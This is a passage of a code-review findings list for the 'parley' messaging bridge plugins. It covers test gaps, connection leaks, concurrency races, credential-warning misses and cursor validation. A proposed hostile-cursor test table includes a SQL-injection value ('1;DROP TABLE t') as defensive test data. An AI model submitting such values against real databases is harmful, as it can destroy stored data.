remediation: EXPLAIN the plugin's own statement text: expose the prune SQL as an exported constant (or read it back from the plugin's prepared statement) and have the test plan that string, so a change to the shipped SQL is what the assertion sees.
testUpgrade: Table the plan check over every long-lived statement the plugin prepares (selectAfterStmt, selectRecentStmt, maxIdStmt, pruneStmt, seqStmt), each sourced from a single exported SQL map that connect() also prepares from, asserting each plan uses a named index and that none contains an un-indexed `SCAN messages`. That guards the class 'a query the plugin actually runs degrades to a scan' for statements added later, not just the prune. Add a second arm that times a prune against a large store while a peer connection posts, to catch a lock held past busy_timeout.

summary: 'stdin EOF shutdown wiring is idempotent (unit)' declares its own `shuttingDown` flag and its own `shutdown()` and then asserts on them. It never imports or executes cli.ts, so it grades the test file's transcription of the wiring, which its own comment calls "verbatim" — a duplication that cannot detect drift.
failure: Delete the `if (shuttingDown) return;` guard from packages/bridge-sqlite/src/cli.ts (or drop one of the two `process.stdin.on(...)` registrations) and this case still passes, because it never touches that code. The e2e case below it does not close the gap either: with the guard gone, `bridge.shutdown()` simply runs twice and the child still exits 0, so the double-shutdown path this unit case names is uncovered end to end.
remediation: Either delete the unit case (the e2e EOF case is the real coverage) or export the shutdown wiring from cli.ts as a testable function — e.g. `installShutdown({ stdin, signals, onShutdown })` — and drive that exported function from the test.
testUpgrade: Extract the wiring and table-drive the trigger dimension against the exported function: {'end', 'close', 'end then close', SIGINT, SIGTERM, 'SIGINT racing end', 'close then SIGTERM'} x asserting the shutdown callback ran exactly once and process exit was requested once. That guards the class 'a lifecycle guard is graded against a copy of itself' for the signal handlers too, and would fail on a removed guard or a missing listener.

summary: tsconfig.json sets include: ["src/**/*"] and exclude: ["src/**/*.test.ts"], so neither src/*.test.ts nor anything under test/ belongs to any tsconfig project. `npm run typecheck` is `tsc -b`, and vitest transpiles with esbuild without type checking — the package's ~1,800-line test surface is never type-checked by anything.
failure: Appended `const __typeHole: number = "not a number";` to both packages/bridge-sqlite/test/lifecycle.test.ts and packages/bridge-sqlite/src/index.test.ts, then ran `npx tsc -b --force` from the repo root: exit 0, no diagnostics. CI runs `npm run build` (the same `tsc -b`) and `npm test`, so a type error anywhere in the tests — including a stale plugin API inside an `as unknown as { selectAfterStmt: Stmt }` private-field poke, of which this package has several — reaches main unreported.

This guards the class 'source that exists but is in no tsconfig project' rather than this one exclude line.

summary: The WAL-conversion retry loop retries any failure of `PRAGMA journal_mode = WAL`, not just lock-classed ones. A permanently-failing pragma therefore costs ~315 ms of synchronous, event-loop-blocking Atomics.wait per open and then emits a diagnostic that names lock contention as the cause when the cause is something else entirely.
failure: With db_path pointing at an existing non-database file (a typo'd path), every connect() prints `parley-sqlite: WAL conversion still busy after 20 retries; continuing in default journal mode: file is not a database` — telling an operator to look for a peer holding the write lock when the file simply is not a SQLite database. Measured: 50 such connects took 14.9 s wall, ~300 ms of it synchronous Atomics.wait per attempt, all before the real error (`file is not a database`, from exec(SCHEMA)) surfaces. The same misreport applies to a read-only mount (SQLITE_READONLY) and a full volume.
remediation: Retry only lock-classed failures — reuse the existing `classifyDbError` (move it into its own module so driver.ts can import it without a cycle) and rethrow anything that is not `lock` immediately, so the precise open/pragma error is what the operator sees and no time is spent spinning on it.
testUpgrade: Table-drive the pragma-retry decision over the error classes the loop can meet — {SQLITE_BUSY, SQLITE_LOCKED} must retry-then-degrade with the 'still busy' line; {file is not a database, SQLITE_READONLY, SQLITE_CORRUPT, an unclassified error} must propagate on the first attempt, with the loop's wall time asserted below one retry interval and the 'still busy' line asserted absent. Mirrors the shape of test/background-jobs.test.ts's ERROR_CASES matrix, so the same class stays covered when a new SQLite error code appears. Existing src/driver.test.ts 'openDriver concurrent first-boot WAL race' only covers the lock arm.

summary: Three properties are each asserted in three different files with near-identical setup, so a reviewer cannot tell which file owns them and a change has to be chased through all three: pragma read-back, at-rest 0600 mode, and the poll loop's error-class behaviour.
failure: Pragma read-back: test/multi-process.test.ts:51-73 and test/driver-parity.test.ts:101-118 declare the same PRAGMAS table (journal_mode/wal, busy_timeout/5000, synchronous/1) and assert the same read-back; the parity version already runs it for both drivers, making the multi-process copy a strict subset. At-rest mode: test/at-rest-mode.test.ts (11-row matrix), test/driver-parity.test.ts 'narrows a pre-existing world-readable store...' and src/driver.test.ts 'creates the DB and its -wal/-shm sidecars 0600' all assert 0600 on db+wal+shm; the last two are rows the matrix already contains ('absent' and 'db 0644'). Poll-loop errors: src/index.test.ts 'diagnoses a permanently-failing poll tick and stops the loop...' and 'takes the quiet-retry path for a SQLITE_BUSY/LOCKED tick' assert exactly what test/background-jobs.test.ts's ERROR_CASES rows 'no such table' and 'SQLITE_BUSY' already assert (stopped + diagnosed, live + silent), with a slower DROP TABLE setup. Each duplicate costs seconds and cannot fail independently of its twin.
remediation: Keep one owner per property: pragma read-back in driver-parity.test.ts (it grades both drivers) with multi-process keeping only its distinctive arms (the README-consequence assertions, the -wal sidecar on disk, the contended-write timing, the DDL-drift comparison); at-rest mode only in at-rest-mode.test.ts (add a driver dimension to its matrix if fallback coverage is wanted) and delete the two subset cases; delete the two src/index.test.ts poll-loop cases now that background-jobs.test.ts grades all nine error classes.
testUpgrade: Where a property genuinely needs more than one dimension, express it as one matrix with the extra dimension added (driver kind x pre-existing mode; error class x job) rather than a second file. A cheap guard against regrowth: a meta test asserting each of a named set of property tags ('pragma-readback', 'at-rest-mode', 'poll-error-class') appears in exactly one test file of the package — the same shape as packages/conformance's CLAUSES table, which already proves the pattern works here.

summary: The plugin's page ceiling (MAX_PAGE = 10000) exists only as a runtime rejection. Core validates `catchup.limit` as any positive integer, so a config core certifies as valid starts the bridge, opens and mutates the store, and only then dies — the seam has no way for a plugin to declare a limit core could validate against.
failure: `catchup: { limit: 10001 }` in an otherwise valid config: loadConfig accepts it, connect() opens (and, with retention_days, prunes) the store, `parley-sqlite: bridge up` is never reached, and the process exits non-zero with `parley-sqlite: fatal: parley-sqlite: invalid limit 10001 ...`. The package's own src/cli.test.ts e2e case pins exactly this outcome, so the behaviour is confirmed and deliberate — the finding is that fail-fast is unreachable from where the operator's value is validated, which per CLAUDE.md prime directive #2 is a seam gap to surface rather than absorb.
remediation: Surface it at the seam: an optional plugin-declared capability (e.g. `maxFetchLimit?: number` on BackendPlugin, or a capabilities() accessor) that core consults when validating catchup.limit, so an out-of-range value is a config-load error before any store is touched. Do not clamp — the README's reasoning for rejecting over clamping is sound and should survive the change. This needs a core-owned change; report, do not work around.
testUpgrade: Once the seam carries the cap, add a parameterized config-load test over (declared cap, configured catchup.limit) — {below, equal, one above, far above} x {plugin declares a cap, plugin declares none} — asserting the load fails by name before connect() is called (spy on plugin.connect), and keep the existing e2e rows as the fallback arm for a plugin that declares nothing. That guards the class 'a plugin constraint discoverable only at runtime' for every future knob, not just limit.

summary: `in_reply_to` is selected by both hot read paths and typed on MessageRow, but rowToMessage never reads it and no Message field carries it — every fetchRecent page and every poll tick pays for a column whose value cannot reach any caller.
failure: post(topic, handle, content, { inReplyTo }) persists the value; selectAfterStmt/selectRecentStmt (index.ts:153-159) fetch it on every row; rowToMessage drops it. A reader of this file cannot tell whether threading is a supported feature that is broken or an unimplemented one, and MessageRow.in_reply_to in schema.ts reads as live. src/index.test.ts 'post persists inReplyTo' has to reach past the plugin with raw SQL precisely because nothing above the driver can observe it.
remediation: Drop in_reply_to from both SELECT lists and from MessageRow while the seam's Message has no reply field — the write path and its raw-SQL test stay as the durable record that the column is populated. If threading is intended to surface, that is a seam change to raise, not a column to keep reading into a value that is discarded.
testUpgrade: Add a check that every column each prepared SELECT names is consumed by rowToMessage: derive the select list from a shared column constant that rowToMessage also destructures, so an unread column is a compile error rather than a silent cost. Guards the class 'query reads a column no consumer maps' for columns added later.

summary: Every reader-open error path calls `reader.disconnect()` while the reader's `connect()` is still in flight — exactly the orphan hazard the `connecting` guard in `tearDown()` exists to prevent. `connectReader` bounds the handshake with `withDeadline`, so when the handshake (not the TCP connect) outruns `connect_timeout_ms`, `blockingRead`'s `finally` (and `startReadLoop`'s catch, line 621) disconnects a client that has no socket yet; the handshake then completes onto a live socket that nothing can ever close. On the long-poll path the deadline error is swallowed (`catch { return [] }`), so the leak is silent and repeats once per `parley_fetch_recent` long-poll until Redis hits `maxclients` and even catch-up dies.
failure: Endpoint whose first connection proxies a real Redis and whose 2nd+ connections accept TCP and never speak RESP; `connect({connect_timeout_ms: 400})` succeeds, then three `fetchRecent({topic, since, blockMs: 2000})` calls each return an empty page with no error while the server-side live-socket count goes 2 -> 3 -> 4; after `await plugin.disconnect()` and 1.5s, 3 sockets are still open. Same shape via `subscribe()`: subscribe rejects with `cannot reach …` and leaves 1 permanently open socket.
remediation: Never call `disconnect()` on a client whose `connect()` promise has not settled. summary: The sub-millisecond long-poll budget is floored twice for the same reason: `readWindow` floors and gates on `block > 0` (line 527, five comment lines), then `blockingRead` re-floors with `if (blockMs <= 0) return []` (line 574, three more comment lines about `XREAD BLOCK 0`). `blockingRead` is private with exactly one call site, so the second guard is unreachable and its paragraph restates the first. Two copies of one invariant is how they drift.

Either compute the floored budget in `readWindow` and let `blockingRead` take a `blockMs: number` it trusts (deleting the second guard and its comment), or move the floor into `blockingRead` and pass `args.blockMs` through. Keep a single short 'keep the floor, so that XREAD BLOCK 0 never blocks forever' note at whichever site survives.
testUpgrade: Pin the behaviour once so the guard can be consolidated safely: parameterize a fetchRecent case over sub-integer budgets `[0.1, 0.5, 0.999]` x [since at tail, since below tail] asserting the call returns promptly (< 200ms) with `nextCursor === since` — that covers the class regardless of which layer does the flooring.

summary: connect()'s already-connected guard tests `this.pool !== undefined`, but `this.pool` is only published after the awaited bootstrap. Two concurrent connect() calls both pass the guard, both bootstrap, and both assign `this.pool` — the loser's Pool (and its prune timer, when retention_days is set) is unreachable and never end()ed.
failure: `await Promise.all([p.connect(cfg), p.connect(cfg)])` on a plugin -> both promises FULFIL (no `already connected` rejection), two Pools are constructed, and after `await p.disconnect()` only one is ended: probe printed `pools created 2 ended [false,false]` then `after disconnect, ended: [false,true]`. On a real server that is `pool_size` server backends held for the life of the process, plus an unref'd interval still issuing DELETEs into a later lifecycle. README ('connect() rejects if the plugin is already connected... a second connect() would otherwise strand the previous pool and prune timer') is false under concurrency.
remediation: Publish an in-flight marker before the first await — e.g. set a `connecting`/`lifecycle` field synchronously at the top of connect() and reject the second call against it, or memoize the connect promise so a concurrent call awaits the same one. Either way the guard must be evaluated and armed before the bootstrap await.
testUpgrade: Add a parameterized 'concurrent lifecycle calls' table over CONCURRENCY x {2,3,5} x {retention on/off} x {same config, different table_name} that fires the calls with Promise.allSettled and asserts (i) exactly one fulfils and the rest reject naming parley-postgres, and (ii) after disconnect(), the number of Pool constructions equals the number of Pool.end() calls and pruneTimer is undefined. The existing connection-hygiene SEQUENCES case 'connect;connect' is sequential and cannot reach this; widen it to a concurrent arm, and on the real-server side assert settledBackendCount(appName) === 0. The same class covers concurrent subscribe/disconnect/connect interleavings against every field published after an await.

summary: drain() checks `stopped`/`epoch` only BEFORE its pool read, never between the read resolving and the handler fan-out. `pool.end()` waits for the in-flight query, so a drain read outstanding at teardown resolves with rows and pushes them into subscriber handlers after `disconnect()` has already resolved.
failure: subscribe(t, h); a NOTIFY starts a drain whose SELECT is still in flight; call and await disconnect(); the SELECT then resolves and `h` fires. Probe printed `disconnected: true delivered AFTER disconnect resolved: [ 'in-flight' ]`. Via core's push loop that is an `emitChannel` <channel> event injected into a session the bridge has already shut down — the seam declares disconnect() cancels all subscriptions.
remediation: Re-check `this.stopped || epoch !== this.epoch` immediately after the `await this.require().query(...)` in drain(), before advancing `lastSeen` and before the handler loop, and return if it fires (the sub is already dropped from `this.subs`, so nothing is lost).
testUpgrade: Parameterize a 'no callback fires after teardown resolves' table over every await a delivery path parks on (drain read, waitForNotify re-check, reconnect re-drain) x {0,1,DRAIN_BATCH+1} rows, gating the pool read on a deferred: start the path, await disconnect(), release the read, and assert the handler was never invoked. The conformance clause 'disconnect is idempotent and stops the plugin serving' only asserts `live` is unchanged when no read is in flight, so it cannot see this; the same table should also cover post()/fetchRecent() resolving after teardown.

summary: usesDefaultCredentials() reads only `URL.username`/`URL.password`, but `new Pool({connectionString})` parses via pg-connection-string, which also honours libpq `?user=`/`?password=` query parameters. A DSN carrying the repo-public parley/parley pair in that form connects with published credentials and the SECURITY warning never fires.
failure: `backend_config.url: "postgres://127.0.0.1:5432/parley?user=parley&password=parley"` -> `pg-connection-string.parse` returns `{user:'parley',password:'parley',...}` (verified by running it), so the plugin connects with the repo-public pair, while `usesDefaultCredentials` returns false and `connect()` emits no warning. README claims 'the plugin warns at connect() whenever the DSN carries it, whatever host it points at' — false for this spelling. Same miss for percent-encoded/`PGPASSWORD`-env forms.
remediation: Derive the effective credentials the way pg does — call `pg-connection-string`'s parse (already a transitive dep of `pg`) — and compare its `user`/`password` (falling back to PGUSER/PGPASSWORD) against the defaults, instead of hand-parsing with `new URL`.
testUpgrade: Widen the creds-warning DSN_CASES table to a generator over credential-carrying spellings: userinfo, `?user=`/`?password=` query params, mixed (userinfo user + query password), percent-encoded values, `postgresql://` scheme, host/port/database variations, and PGUSER/PGPASSWORD env fallback — asserting that every DSN whose *pg-parsed* credentials equal parley/parley warns exactly once and every other DSN warns zero times. Guarding the class means driving the expectation off pg's own parse, not off a hand-listed string set.

summary: ensureListener() memoizes the listener in `listenerPromise`, and neither the `error` nor the `end` handler clears it. During a listener blackout — the window the backoff loop exists to cover — ensureListener hands back the dead Client, so subscribe() rejects with node-postgres' raw message instead of joining the in-flight reconnect.
failure: connect(); subscribe('a'); the server drops the listener socket and reconnect attempts keep failing; `subscribe(asTopic('b'), h)` -> rejects `Client was closed and is not queryable` (probe output), an error naming neither the plugin nor the topic. core/transport/push-loop.ts rethrows anything that is not NoSuchTopicError, so the whole push attach fails and the bridge does not come up; the same subscribe succeeds once the reconnect lands. The plugin's own docstring says a listener drop 'costs latency, never a message'.
remediation: Clear `listenerPromise` when the listener ends/errors and have ensureListener() await the reconnect (or re-create) rather than resolve a closed Client; failing that, wrap the LISTEN failure in an error naming parley-postgres and the topic so an operator can act on it.
testUpgrade: Add a parameterized 'seam calls during a listener blackout' table over {subscribe, blocking fetchRecent, repeat subscribe on an already-subscribed topic} x {reconnect succeeds on attempt 1, 3, never within the budget}: assert each call either resolves once the reconnect lands or rejects with a message matching /^parley-postgres:/ that names the topic — never a raw driver string. Existing lifecycle 'reconnect-*' cells only assert nothing is resurrected after disconnect, so they never issue a seam call mid-blackout.

summary: `since` is an opaque, agent-supplied string (core's parley_fetch_recent takes `since: z.string().optional()` and passes it through unvalidated), and this plugin binds it into `seq > $2::bigint`. Any cursor that is not a bigint literal makes fetchRecent reject with a raw PostgreSQL error instead of failing fast with a plugin-named error or an empty page.
failure: An agent calls `parley_fetch_recent({topic:'t', since:'abc'})` (or `''`, `'1e3'`, `'9223372036854775808'`, or a cursor carried over from another backend's store) -> PostgreSQL raises 22P02 `invalid input syntax for type bigint: "abc"`, which tools.ts rethrows, so the agent's tool result is a raw database error string — database internals rendered into agent context, and a hallucinated cursor becomes a hard failure rather than a benign empty window. Sibling backends coerce or ignore the value, so the same input behaves four ways across certified backends.
remediation: Validate the cursor once at the plugin edge (e.g. `/^\d{1,19}$/`, range-checked against bigint) and reject with `parley-postgres: invalid cursor …` naming the value, or treat an unparseable cursor as position 0 — but pick one and state it, rather than letting the cast decide.
testUpgrade: Add a hostile-cursor table, parameterized over `{'', 'abc', '1e3', '-1', ' 5 ', '9223372036854775808', '0x10', '1;DROP TABLE t', '٥'}` x {blockMs 0, blockMs>0}, asserting fetchRecent either resolves to an empty page with a stable nextCursor or rejects with /^parley-postgres:/ — never with a driver/SQLSTATE string. This belongs in the shared conformance suite too, since 'what a plugin does with a cursor it did not mint' is currently ungraded for every backend.

summary: Every read qualifies `ORDER BY ${this.names.messages}.seq` because a bare `ORDER BY seq` binds to the `seq::text AS seq` OUTPUT alias and sorts lexicographically. That trap is defended only by a comment: no test pins the qualification, and the conformance case that could notice only does so when a topic's seq values happen to straddle a digit-length boundary.
failure: Mutating the since-less read to `ORDER BY seq DESC` left the entire non-server suite green (267 passed / 11 skipped) — fake-pg's DIRECTION regex requires the qualified spelling and silently falls back to ascending. On a real server the mutation is message loss, not just misordering: with seqs 9,10,11 after a cursor, `ORDER BY seq ASC LIMIT 1` returns '10', nextCursor advances to 10, the next page returns 11, and row 9 is durably stored and permanently unreachable. Conformance's 'since-less fetch returns the NEWEST messages' posts only 5 rows into a table whose seq counter is already high, so it usually sees a same-digit-length range and passes.
remediation: Remove the trap rather than documenting it: alias the projection to something that cannot shadow the sort key (`seq::text AS cursor`, mapped in rowToMessage), so a bare `ORDER BY seq` resolves to the column. Failing that, assert the qualified spelling in a schema/SQL-shape test.
testUpgrade: Two-part class guard: (1) a fake-based ordering table whose rows deliberately straddle digit boundaries (seqs 8..12, 98..102, 998..1002) x {since-less DESC page, exclusive-since ASC page, drain} asserting numeric order and no lost row — this fails under lexicographic sorting regardless of alias binding; (2) make fake-pg reject rather than silently default when it cannot classify a SELECT's direction, so a query shape it does not understand fails loudly instead of being served ascending. Item (1) is worth lifting into the conformance suite as a seeded high-cursor case, since the same trap exists in any backend whose cursor is numeric-but-stringified.

summary: The published package README carries maintainer-internal, reviewer-directed argument about the test suite ('Two different tests hold that, and they prove different things… If you are tempted to remove or refactor the lock, run that second file — a green conformance run is not evidence'), which CLAUDE.md places in the commit message, not in prose aimed at the next reviewer.
failure: An npm consumer of @sharptrick/parley-postgres reads, in the package description surface, instructions about which internal test file to run and an assertion that the project's own conformance suite is not evidence — content that is true of the repo, not of the shipped artifact, and that rots against the suite it names (it hard-codes `test/cursor-loss.test.ts`).
remediation: Keep the operator-facing sentence (the per-topic advisory lock is what makes the cursor lossless under concurrent writers) and move the test-strategy paragraph and the 'if you are tempted to refactor' warning into the commit message / CONTRIBUTING, or into a code comment phrased as the risk at the lock itself.
